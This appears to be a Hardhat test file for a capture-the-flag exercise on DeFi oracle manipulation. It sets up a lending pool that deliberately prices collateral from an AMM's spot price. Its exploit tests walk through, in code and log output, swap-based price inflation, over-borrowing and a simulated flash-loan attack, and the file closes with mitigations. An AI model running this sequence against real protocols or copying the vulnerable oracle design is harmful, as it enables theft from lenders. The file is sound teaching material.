import { expect } from "chai";
import { ethers } from "hardhat";

describe("Oracle Manipulation CTF", function () {
  let token: any;
  let usdc: any;
  let amm: any;
  let lendingPool: any;
  let owner: any;
  let attacker: any;
  let liquidityProvider: any;

  const INITIAL_LIQUIDITY_TOKEN = ethers.parseEther("10000"); // 10,000 TOKEN
  const INITIAL_LIQUIDITY_USDC = ethers.parseEther("10000");  // 10,000 USDC (1:1 ratio initially)
  const LENDING_POOL_USDC = ethers.parseEther("100000");      // 100,000 USDC in lending pool

  beforeEach(async function () {
    [owner, attacker, liquidityProvider] = await ethers.getSigners();

    // Deploy ERC20 tokens
    const ERC20Mock = await ethers.getContractFactory("ERC20Mock");
    token = await ERC20Mock.deploy("Vulnerable Token", "VULN");
    usdc = await ERC20Mock.deploy("USD Coin", "USDC");

    // Deploy AMM (DEX)
    const SimpleAMM = await ethers.getContractFactory("SimpleAMM");
    amm = await SimpleAMM.deploy(await token.getAddress(), await usdc.getAddress());

    // Deploy Lending Pool (uses AMM as oracle)
    const LendingPool = await ethers.getContractFactory("LendingPool");
    lendingPool = await LendingPool.deploy(
      await token.getAddress(),
      await usdc.getAddress(),
      await amm.getAddress() // 💀 Using AMM's spot price as oracle!
    );

    // Setup: Mint tokens to liquidity provider
    await token.mint(liquidityProvider.address, INITIAL_LIQUIDITY_TOKEN);
    await usdc.mint(liquidityProvider.address, INITIAL_LIQUIDITY_USDC);

    // Setup: Add initial liquidity to AMM (1:1 ratio = 1 TOKEN = 1 USDC)
    await token.connect(liquidityProvider).approve(await amm.getAddress(), INITIAL_LIQUIDITY_TOKEN);
    await usdc.connect(liquidityProvider).approve(await amm.getAddress(), INITIAL_LIQUIDITY_USDC);
    await amm.connect(liquidityProvider).addLiquidity(INITIAL_LIQUIDITY_TOKEN, INITIAL_LIQUIDITY_USDC);

    // Setup: Fund lending pool with USDC
    await usdc.mint(await lendingPool.getAddress(), LENDING_POOL_USDC);
  });

  describe("Contract Deployment", function () {
    it("Should deploy all contracts correctly", async function () {
      expect(await token.name()).to.equal("Vulnerable Token");
      expect(await usdc.name()).to.equal("USD Coin");
      expect(await amm.token()).to.equal(await token.getAddress());
      expect(await amm.usdc()).to.equal(await usdc.getAddress());
      expect(await lendingPool.oracle()).to.equal(await amm.getAddress());
    });

    it("Should have correct initial liquidity", async function () {
      expect(await amm.reserveToken()).to.equal(INITIAL_LIQUIDITY_TOKEN);
      expect(await amm.reserveUSDC()).to.equal(INITIAL_LIQUIDITY_USDC);
    });

    it("Should have initial spot price of 1 USDC per TOKEN", async function () {
      const spotPrice = await amm.getSpotPrice();
      expect(spotPrice).to.equal(ethers.parseEther("1")); // 1e18 = 1 USDC
    });
  });

  describe("Normal Operations", function () {
    it("Should allow normal collateral deposit", async function () {
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      expect(await lendingPool.collateral(attacker.address)).to.equal(depositAmount);
    });

    it("Should allow borrowing within LTV limits", async function () {
      // Deposit 100 TOKEN as collateral
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // With 100 TOKEN at 1 USDC price = 100 USDC collateral value
      // LTV 80% = max 80 USDC borrow
      const borrowAmount = ethers.parseEther("80");
      await lendingPool.connect(attacker).borrow(borrowAmount);

      expect(await lendingPool.debt(attacker.address)).to.equal(borrowAmount);
      expect(await usdc.balanceOf(attacker.address)).to.equal(borrowAmount);
    });

    it("Should reject borrowing above LTV limits", async function () {
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // Try to borrow 81 USDC (above 80% LTV)
      const borrowAmount = ethers.parseEther("81");
      await expect(
        lendingPool.connect(attacker).borrow(borrowAmount)
      ).to.be.revertedWith("Too much borrow");
    });
  });

  describe("AMM Swap Mechanics", function () {
    it("Should change spot price after swaps", async function () {
      const initialPrice = await amm.getSpotPrice();
      console.log("Initial price:", ethers.formatEther(initialPrice), "USDC/TOKEN");

      // Swap USDC for TOKEN (buying TOKEN -> price goes up)
      const swapAmount = ethers.parseEther("5000");
      await usdc.mint(attacker.address, swapAmount);
      await usdc.connect(attacker).approve(await amm.getAddress(), swapAmount);
      await amm.connect(attacker).swapUSDCForToken(swapAmount);

      const priceAfterBuy = await amm.getSpotPrice();
      console.log("Price after buying TOKEN:", ethers.formatEther(priceAfterBuy), "USDC/TOKEN");
      
      expect(priceAfterBuy).to.be.gt(initialPrice);
    });

    it("Should demonstrate price impact on large swaps", async function () {
      console.log("\n=== Price Impact Analysis ===");
      
      const testAmounts = [
        ethers.parseEther("1000"),
        ethers.parseEther("5000"),
        ethers.parseEther("9000"),
      ];

      for (const amount of testAmounts) {
        // Reset: Get fresh attacker with USDC
        await usdc.mint(attacker.address, amount);
        await usdc.connect(attacker).approve(await amm.getAddress(), amount);
        
        const priceBefore = await amm.getSpotPrice();
        await amm.connect(attacker).swapUSDCForToken(amount);
        const priceAfter = await amm.getSpotPrice();
        
        console.log(`Swap ${ethers.formatEther(amount)} USDC:`);
        console.log(`  Before: ${ethers.formatEther(priceBefore)} USDC/TOKEN`);
        console.log(`  After:  ${ethers.formatEther(priceAfter)} USDC/TOKEN`);
        console.log(`  Increase: ${((Number(priceAfter) / Number(priceBefore) - 1) * 100).toFixed(2)}%\n`);
      }
    });
  });

  describe("🔥 ORACLE MANIPULATION EXPLOIT 🔥", function () {
    it("Should exploit spot price to over-borrow", async function () {
      console.log("\n" + "=".repeat(60));
      console.log("            💀 ORACLE MANIPULATION ATTACK 💀");
      console.log("=".repeat(60));

      // ============ SETUP: Attacker's initial position ============
      const attackerCollateral = ethers.parseEther("100"); // 100 TOKEN for collateral
      const attackerUSDC = ethers.parseEther("9000");       // 9000 USDC for manipulation

      await token.mint(attacker.address, attackerCollateral);
      await usdc.mint(attacker.address, attackerUSDC);

      console.log("\n[1] ATTACKER INITIAL STATE:");
      console.log(`    TOKEN balance: ${ethers.formatEther(await token.balanceOf(attacker.address))}`);
      console.log(`    USDC balance:  ${ethers.formatEther(await usdc.balanceOf(attacker.address))}`);

      // ============ STEP 1: Deposit small collateral ============
      console.log("\n[2] DEPOSITING COLLATERAL:");
      await token.connect(attacker).approve(await lendingPool.getAddress(), attackerCollateral);
      await lendingPool.connect(attacker).depositCollateral(attackerCollateral);
      console.log(`    Deposited: ${ethers.formatEther(attackerCollateral)} TOKEN`);

      // Check normal borrowing power
      const initialPrice = await amm.getSpotPrice();
      const initialBorrowPower = (attackerCollateral * initialPrice * 80n) / (100n * ethers.parseEther("1"));
      console.log(`    Spot price: ${ethers.formatEther(initialPrice)} USDC/TOKEN`);
      console.log(`    Normal max borrow (80% LTV): ${ethers.formatEther(initialBorrowPower)} USDC`);

      // ============ STEP 2: Manipulate oracle by swapping ============
      console.log("\n[3] 💥 MANIPULATING ORACLE (large USDC->TOKEN swap):");
      await usdc.connect(attacker).approve(await amm.getAddress(), attackerUSDC);
      await amm.connect(attacker).swapUSDCForToken(attackerUSDC);

      const manipulatedPrice = await amm.getSpotPrice();
      const tokenReceived = await token.balanceOf(attacker.address);
      console.log(`    Swapped: ${ethers.formatEther(attackerUSDC)} USDC`);
      console.log(`    Received: ${ethers.formatEther(tokenReceived)} TOKEN`);
      console.log(`    NEW spot price: ${ethers.formatEther(manipulatedPrice)} USDC/TOKEN`);
      console.log(`    Price increase: ${((Number(manipulatedPrice) / Number(initialPrice) - 1) * 100).toFixed(2)}%`);

      // ============ STEP 3: Borrow with inflated collateral value ============
      console.log("\n[4] 🎯 BORROWING WITH INFLATED PRICE:");
      const inflatedBorrowPower = (attackerCollateral * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));
      console.log(`    Inflated max borrow: ${ethers.formatEther(inflatedBorrowPower)} USDC`);

      // Borrow the maximum inflated amount
      const borrowAmount = inflatedBorrowPower;
      await lendingPool.connect(attacker).borrow(borrowAmount);
      console.log(`    Actually borrowed: ${ethers.formatEther(borrowAmount)} USDC`);
      console.log(`    PROFIT vs normal: ${ethers.formatEther(borrowAmount - initialBorrowPower)} USDC`);

      // ============ STEP 4: Swap back TOKEN->USDC (optional, to complete attack) ============
      console.log("\n[5] REVERSING SWAP (TOKEN->USDC):");
      const tokenToSwapBack = await token.balanceOf(attacker.address);
      await token.connect(attacker).approve(await amm.getAddress(), tokenToSwapBack);
      await amm.connect(attacker).swapTokenForUSDC(tokenToSwapBack);

      const finalUSDC = await usdc.balanceOf(attacker.address);
      const finalPrice = await amm.getSpotPrice();
      console.log(`    Swapped back: ${ethers.formatEther(tokenToSwapBack)} TOKEN`);
      console.log(`    Price restored to: ${ethers.formatEther(finalPrice)} USDC/TOKEN`);

      // ============ FINAL ACCOUNTING ============
      console.log("\n" + "=".repeat(60));
      console.log("                    📊 ATTACK SUMMARY");
      console.log("=".repeat(60));
      console.log(`    Initial USDC: ${ethers.formatEther(attackerUSDC)}`);
      console.log(`    Initial TOKEN: ${ethers.formatEther(attackerCollateral)}`);
      console.log(`    Final USDC:   ${ethers.formatEther(finalUSDC)}`);
      console.log(`    Final TOKEN:  ${ethers.formatEther(await token.balanceOf(attacker.address))}`);
      console.log(`    Debt:         ${ethers.formatEther(await lendingPool.debt(attacker.address))} USDC`);
      console.log(`    Collateral:   ${ethers.formatEther(await lendingPool.collateral(attacker.address))} TOKEN`);
      
      const netProfit = finalUSDC - attackerUSDC;
      console.log(`\n    🚨 NET USDC CHANGE: ${Number(netProfit) > 0 ? '+' : ''}${ethers.formatEther(netProfit)} USDC`);
      console.log(`    💰 BORROWED ABOVE NORMAL: ${ethers.formatEther(borrowAmount - initialBorrowPower)} USDC`);
      console.log("=".repeat(60) + "\n");

      // Assertion: Attacker was able to borrow MORE than normal 80 USDC
      expect(borrowAmount).to.be.gt(initialBorrowPower);
    });

    it("Should demonstrate flash loan style attack (single block)", async function () {
      console.log("\n" + "=".repeat(60));
      console.log("         ⚡ FLASH LOAN STYLE ATTACK (ATOMIC) ⚡");
      console.log("=".repeat(60));

      // Simulate attacker with access to flash loaned funds
      const flashLoanAmount = ethers.parseEther("50000");
      const collateralAmount = ethers.parseEther("1000");

      // Attacker starts with some collateral token and gets USDC flash loan
      await token.mint(attacker.address, collateralAmount);
      await usdc.mint(attacker.address, flashLoanAmount); // Simulating flash loan

      console.log("\n[1] Setup: 1000 TOKEN collateral + 50000 USDC (flash loan)");

      // All in one "block":
      // 1. Deposit collateral
      await token.connect(attacker).approve(await lendingPool.getAddress(), collateralAmount);
      await lendingPool.connect(attacker).depositCollateral(collateralAmount);
      console.log("[2] Deposited 1000 TOKEN as collateral");

      const normalPrice = await amm.getSpotPrice();
      const normalMaxBorrow = (collateralAmount * normalPrice * 80n) / (100n * ethers.parseEther("1"));
      console.log(`[3] Normal borrow power: ${ethers.formatEther(normalMaxBorrow)} USDC`);

      // 2. Manipulate price
      await usdc.connect(attacker).approve(await amm.getAddress(), flashLoanAmount);
      await amm.connect(attacker).swapUSDCForToken(flashLoanAmount);
      console.log("[4] Swapped 50000 USDC -> TOKEN (price manipulation)");

      const manipulatedPrice = await amm.getSpotPrice();
      console.log(`[5] Manipulated price: ${ethers.formatEther(manipulatedPrice)} USDC/TOKEN`);

      // 3. Over-borrow
      const maxBorrow = (collateralAmount * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));
      await lendingPool.connect(attacker).borrow(maxBorrow);
      console.log(`[6] Borrowed: ${ethers.formatEther(maxBorrow)} USDC`);

      // 4. Swap back to repay "flash loan"
      const tokensHeld = await token.balanceOf(attacker.address);
      await token.connect(attacker).approve(await amm.getAddress(), tokensHeld);
      await amm.connect(attacker).swapTokenForUSDC(tokensHeld);
      console.log("[7] Swapped TOKEN back to USDC");

      const finalUSDC = await usdc.balanceOf(attacker.address);
      console.log(`\n[8] FINAL USDC: ${ethers.formatEther(finalUSDC)}`);
      console.log(`    Flash loan to repay: ${ethers.formatEther(flashLoanAmount)}`);
      
      // In real attack, profit = finalUSDC - flashLoanAmount (if positive)
      // The borrowed USDC from lending pool is pure profit (minus slippage)
      console.log(`    Borrowed from pool: ${ethers.formatEther(maxBorrow)} USDC`);
      console.log(`    Extra borrowed vs fair value: ${ethers.formatEther(maxBorrow - normalMaxBorrow)} USDC`);
      console.log("=".repeat(60) + "\n");

      expect(maxBorrow).to.be.gt(normalMaxBorrow);
    });
  });

  describe("Vulnerability Analysis", function () {
    it("Should show correlation between swap size and exploit profit", async function () {
      console.log("\n=== Exploit Profitability Analysis ===\n");
      console.log("Swap Amount | Price After | Extra Borrow Power");
      console.log("-".repeat(50));

      const collateralAmount = ethers.parseEther("100");
      const swapAmounts = [
        ethers.parseEther("1000"),
        ethers.parseEther("3000"),
        ethers.parseEther("5000"),
        ethers.parseEther("7000"),
        ethers.parseEther("9000"),
      ];

      const normalPrice = await amm.getSpotPrice();
      const normalBorrow = (collateralAmount * normalPrice * 80n) / (100n * ethers.parseEther("1"));

      for (const swapAmount of swapAmounts) {
        // Create new attacker for each test
        const [, , , testAttacker] = await ethers.getSigners();
        await usdc.mint(testAttacker.address, swapAmount);
        await usdc.connect(testAttacker).approve(await amm.getAddress(), swapAmount);

        // Get reserves before
        const reserveTokenBefore = await amm.reserveToken();
        const reserveUSDCBefore = await amm.reserveUSDC();

        // Simulate swap and calculate new price
        const k = reserveTokenBefore * reserveUSDCBefore;
        const newReserveUSDC = reserveUSDCBefore + swapAmount;
        const newReserveToken = k / newReserveUSDC;
        const priceAfter = (newReserveUSDC * ethers.parseEther("1")) / newReserveToken;

        const inflatedBorrow = (collateralAmount * priceAfter * 80n) / (100n * ethers.parseEther("1"));
        const extraBorrow = inflatedBorrow - normalBorrow;

        console.log(
          `${ethers.formatEther(swapAmount).padStart(10)} | ` +
          `${ethers.formatEther(priceAfter).slice(0, 8).padStart(11)} | ` +
          `${ethers.formatEther(extraBorrow).slice(0, 10).padStart(15)} USDC`
        );
      }
      console.log("");
    });
  });

  describe("Mitigation Strategies", function () {
    it("Should document recommended fixes", function () {
      console.log("\n" + "=".repeat(60));
      console.log("           🛡️ RECOMMENDED MITIGATIONS 🛡️");
      console.log("=".repeat(60));
      console.log(`
1. USE TWAP (Time-Weighted Average Price)
   - Average price over multiple blocks
   - Resistant to single-block manipulation

2. USE EXTERNAL ORACLES (Chainlink, Pyth)
   - Off-chain price feeds
   - Aggregated from multiple sources
   - Economic guarantees

3. IMPLEMENT BORROWING DELAYS
   - Require time between deposit and borrow
   - Breaks atomic attack vector

4. USE MULTIPLE ORACLE SOURCES
   - Cross-check prices from different DEXs
   - Reject if deviation too high

5. CIRCUIT BREAKERS
   - Pause borrowing if price moves too fast
   - Limit max borrow per block

6. K-VALUE VERIFICATION
   - Verify AMM invariant hasn't changed drastically
   - Detect manipulation attempts
`);
      console.log("=".repeat(60) + "\n");
    });
  });
});
